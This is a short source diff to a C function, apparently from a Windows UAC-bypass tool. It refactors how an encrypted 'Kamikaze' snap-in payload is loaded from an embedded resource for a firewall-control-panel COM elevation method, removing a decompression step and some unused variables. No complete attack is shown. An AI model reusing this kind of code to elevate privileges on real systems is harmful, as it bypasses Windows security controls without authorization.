@@ -645,10 +645,9 @@ NTSTATUS ucmFwCplLuaMethod2(
     BOOL fEnvSet = FALSE, fDirCreated = FALSE;
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
     HRESULT r = E_FAIL, hr_init;
-    ULONG DataSize = 0, SnapinSize = 0;
+    ULONG SnapinSize = 0;
     SIZE_T nLen, PayloadDirNameLen = 0, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0, ProtocolNameLen;
-    PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
-    PVOID ImageBaseAddress = g_hInstance;
+    PVOID SnapinData = NULL, MscBufferPtr = NULL;
     LPOLESTR protoGuidString = NULL;
     CHAR* pszMarker;
     IFwCplLua* FwCplLua = NULL;
@@ -693,17 +692,11 @@ NTSTATUS ucmFwCplLuaMethod2(
         //
         // Decrypt and decompress custom Kamikaze snap-in.
         //
-        SnapinResource = supLdrQueryResourceData(
+        SnapinData = supLdrQueryResourceData(
             KAMIKAZE_ID,
-            ImageBaseAddress,
-            &DataSize);
+            &SnapinSize);
 
-        if (SnapinResource) {
-            SnapinData = g_ctx->DecompressRoutine(KAMIKAZE_ID, SnapinResource, DataSize, &SnapinSize);
-            if (SnapinData == NULL)
-                break;
-        }
-        else
+        if (SnapinData == NULL)
             break;
 
         //
